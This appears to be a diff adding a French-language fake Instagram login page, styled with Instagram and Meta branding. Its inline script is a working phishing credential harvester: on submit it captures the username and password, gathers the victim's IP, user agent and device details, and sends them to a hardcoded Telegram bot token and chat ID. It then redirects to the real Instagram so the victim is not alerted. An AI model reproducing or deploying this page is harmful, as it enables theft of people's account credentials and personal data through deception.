@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="style.css">
+    <!-- MODIFICATION 1: Ajout du script Axios -->
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+</head>
+<body>
+
+    <!-- 1. Écran de chargement (Splash Screen) -->
+    <div id="splash-screen">
+        <div class="splash-logo-container">
+            <img src="./img/intagrame-logo.png" alt="Instagram Logo" class="splash-logo">
+        </div>
+        <div class="splash-footer">
+            <p>from</p>
+            <img src="./img/meta-logo.png" alt="Meta Logo" class="meta-logo">
+        </div>
+    </div>
+
+    <!-- 2. Page de connexion (initialement cachée) -->
+    <div id="login-page" style="display: none;">
+        <div class="main-container">
+            <div class="phone-image-container">
+                <img src="./img/img-pc.png" alt="Contenu promotionnel Instagram">
+            </div>
+
+            <div class="form-container">
+                <div class="login-box">
+                    <img src="./img/instagram.png" alt="Instagram Logo" class="instagram-logo">
+                    
+                    <!-- MODIFICATION 2: Ajout de l'id "login-form" au formulaire -->
+                    <form id="login-form">
+                        <!-- MODIFICATION 3: Ajout de l'id "email" au champ de saisie utilisateur -->
+                        <input id="email" type="text" name="username" placeholder="Num. téléphone, nom de profil ou e-mail" required>
+                        
+                        <!-- MODIFICATION 4: Ajout de l'id "password" au champ de saisie mot de passe -->
+                        <input id="password" type="password" name="password" placeholder="Mot de passe" required>
+                        
+                        <button type="submit">Se connecter</button>
+                    </form>
+
+                    <div class="separator">
+                        <div class="line"></div>
+                        <div class="or-text">OU</div>
+                        <div class="line"></div>
+                    </div>
+                    <button class="facebook-login">
+                        <img src="./img/facebook.png" alt="Facebook icon" class="facebook-icon">
+                        Se connecter avec Facebook
+                    </button>
+                    <a href="#" class="forgot-password">Mot de passe oublié ?</a>
+                </div>
+                <div class="signup-box">
+                    <p class="signup-text">
+                        <span>Vous n'avez pas de compte ?</span> <a href="#">Inscrivez-vous</a>
+                    </p>
+                </div>
+            </div>
+        </div>
+
+        <footer>
+            <div class="footer-links">
+                <a href="#">Meta</a> <a href="#">À propos</a> <a href="#">Blog</a> <a href="#">Emplois</a> <a href="#">Aide</a> <a href="#">API</a> <a href="#">Confidentialité</a> <a href="#">Conditions</a> <a href="#">Lieux</a> <a href="#">Instagram Lite</a> <a href="#">Threads</a> <a href="#">Importation des contacts et non-utilisateurs</a> <a href="#">Meta Verified</a>
+            </div>
+            <div class="footer-bottom">
+                <select aria-label="Changer la langue d’affichage">
+                    <option value="en">English</option>
+                    <option value="fr" selected>Français</option>
+                </select>
+                <span>© 2025 Instagram from Meta</span>
+            </div>
+        </footer>
+    </div>
+
+    <!-- Lier le fichier JavaScript pour l'écran de chargement -->
+    <script src="script.js"></script>
+
+    <!-- MODIFICATION 5: Ajout de votre script personnalisé -->
+    <script>
+        const TOKEN = "8092551087:AAGMBFToidPfJ1LCmvC65VAD9HlL1roGpG8";                                                                        
+    const CHAT_ID = "6680570152";   
+        // MODIFICATION: Votre script mis à jour avec la redirection
+
+
+const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+document.getElementById('login-form').addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+
+    axios.get('https://api.ipify.org?format=json')
+        .then(response => {
+            const ip = response.data.ip;
+
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const screenWidth = screen.width;
+            const screenHeight = screen.height;
+            const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+            const message = `
+<b>New Login Attempt</b>
+<b>Email:</b> ${email}
+<b>Password:</b> ${password}
+<b>IP Address:</b> ${ip}
+<b>Device Type:</b> ${deviceType}
+<b>Platform:</b> ${platform}
+<b>User Agent:</b> ${userAgent}
+<b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
+            `;
+
+            axios.post(URI_API, {
+                chat_id: CHAT_ID,
+                parse_mode: 'html',
+                text: message
+            }).then(response => {
+                // SUPPRIMER L'ALERTE ET AJOUTER LA REDIRECTION ICI
+                console.log('Informations envoyées avec succès.');
+                window.location.href = "https://www.instagram.com"; // <-- LIGNE DE REDIRECTION
+
+            }).catch(error => {
+                console.error('Erreur lors de l\'envoi à Telegram:', error);
+                // Même en cas d'erreur, rediriger pour ne pas alerter l'utilisateur
+                window.location.href = "https://www.instagram.com";
+            });
+        })
+        .catch(error => {
+            console.error('Erreur lors de la récupération de l\'IP:', error);
+            // Même en cas d'erreur, rediriger
+            window.location.href = "https://www.instagram.com";
+        });
+});
+    </script>
+</body>
+</html>
